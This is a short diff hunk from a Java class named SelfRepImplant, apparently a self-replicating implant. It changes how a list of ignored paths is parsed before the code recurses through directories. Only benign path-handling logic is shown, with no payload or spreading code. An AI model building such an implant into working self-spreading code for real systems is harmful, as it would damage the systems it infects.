@@ -158,13 +158,19 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             throw new IllegalArgumentException("Not a directory");
         }
 
-        // Convert provided Strings to actual Path objects
-        String[] ignoreSpecSplit = ignoreSpec.split(";");
-        Set<Path> ignorePaths = new HashSet<>(ignoreSpecSplit.length);
-        for (String pathSpec : ignoreSpecSplit) {
-            pathSpec = expandPath(pathSpec);
-            Path actualPath = Path.of(pathSpec);
-            ignorePaths.add(actualPath);
+        Set<Path> ignorePaths;
+        if (CONF_IGNORED_PATHS == null) {
+            ignorePaths = Collections.emptySet();
+        } else {
+            ignorePaths = new HashSet<>();
+
+            // Convert provided Strings to actual Path objects
+            String[] ignoreSpecSplit = ignoreSpec.split(";");
+            for (String pathSpec : ignoreSpecSplit) {
+                pathSpec = expandPath(pathSpec);
+                Path actualPath = Path.of(pathSpec);
+                ignorePaths.add(actualPath);
+            }
         }
 
         // Recurse through the file structure
